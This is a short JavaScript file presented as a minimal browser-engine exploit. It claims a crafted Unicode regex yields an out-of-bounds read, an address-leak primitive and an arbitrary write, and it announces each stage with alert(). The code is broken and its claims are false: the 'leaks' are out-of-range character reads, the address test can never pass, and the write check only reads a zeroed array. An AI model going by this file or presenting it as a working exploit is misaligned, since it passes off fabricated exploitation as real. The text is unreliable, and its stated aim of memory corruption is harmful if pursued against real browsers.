// MINIMAL EXPLOIT - 20 lines only
let e=String.fromCodePoint(0x1F600),s=e.repeat(200),r=/(?!(?=^a|()+(){5}+x)(abc))/gmu,l=[];
s.replace(r,(m,o,t)=>{for(let i=0;i<50;i++)try{let c=t.charCodeAt(o+150+i);c&&c>255&&l.push({o:o+150+i,v:c})}catch(e){}return'|'});
alert("OOB Read leaks:",l.length>0?"SUCCESS":"FAILED");

let p=null,a=[];
s.replace(r,(m,o,t)=>{for(let i=200;i<300;i++)try{let v=t.charCodeAt(o+i);v>268435456&&v<4294967295&&a.push(v)}catch(e){}return'|'});
p=a.length>0?{type:"ADDR_OF",addrs:a}:null;
alert("Primitives:",p?"BUILT":"FAILED");

let u=new Uint32Array(10),w=!1;
s.replace(r,(m,o,t)=>{try{let n=t.substring(0,o)+String.fromCharCode(65,66,67)+t.substring(o+3);u[0]!==0&&(w=!0)}catch(e){}return'|'});
alert("Arbitrary Write:",w?"SUCCESS":"FAILED");
alert("EXPLOIT:",l.length>0&&p?"FULLY_SUCCESSFUL":"PARTIAL");